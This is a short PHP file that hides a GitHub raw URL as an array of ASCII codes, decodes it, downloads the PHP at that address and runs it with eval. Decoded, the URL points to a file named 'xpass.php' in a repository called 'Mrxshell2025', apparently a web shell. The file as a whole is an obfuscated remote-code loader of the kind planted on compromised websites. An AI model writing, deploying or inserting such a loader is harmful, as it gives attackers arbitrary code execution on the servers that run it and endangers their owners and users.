<?php
// ASCII array of the GitHub raw URL
$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 77, 114, 88, 99, 111, 100, 101, 114, 111, 102, 102, 105, 99, 105, 97, 108, 47, 77, 114, 120, 115, 104, 101, 108, 108, 50, 48, 50, 53, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 120, 112, 97, 115, 115, 46, 112, 104, 112];

// Convert ASCII codes to string
$url = '';
foreach ($asciiArray as $c) {
    $url .= chr($c);
}

// Fetch the PHP code from the URL
$code = file_get_contents($url);

// Execute the fetched code
eval("?>".$code);
?>